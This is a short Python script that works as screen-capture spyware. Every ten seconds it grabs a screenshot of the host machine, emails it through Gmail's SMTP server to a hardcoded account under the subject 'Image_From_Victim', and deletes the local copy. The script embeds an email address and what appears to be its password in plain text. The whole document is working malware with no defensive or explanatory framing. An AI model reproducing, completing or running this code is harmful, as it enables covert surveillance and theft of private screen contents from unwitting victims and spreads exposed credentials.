import subprocess,smtplib,pyscreenshot,time,os,tempfile
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import threading

def sendScreenshot(email,password,imm):
    with open(imm, 'rb') as f:
        img_data = f.read()
    msg = MIMEMultipart()
    msg['Subject'] = 'Image_From_Victim'
    msg['From'] = email
    msg['To'] = email 

    text = MIMEText("test")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(imm))
    msg.attach(image)

    server = smtplib.SMTP("smtp.gmail.com",587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(email,password)
    server.sendmail(email,email,msg.as_string())
    server.quit()

def perform():
    path = tempfile.gettempdir()
    image = pyscreenshot.grab()
    name = time.time()
    os.chdir(path)
    image.show()
    image.save(f"{name}.png")
    sendScreenshot("trickybabu981@gmail.com","8580416557",f"{name}.png")
    os.remove(f"{name}.png")
    threading.Timer(10,perform).start() #you can modify the time according to your need.
                                        #here this will capture the screenshot and return them after every 10 sec
#while True:
 #   perform() 

perform()#call
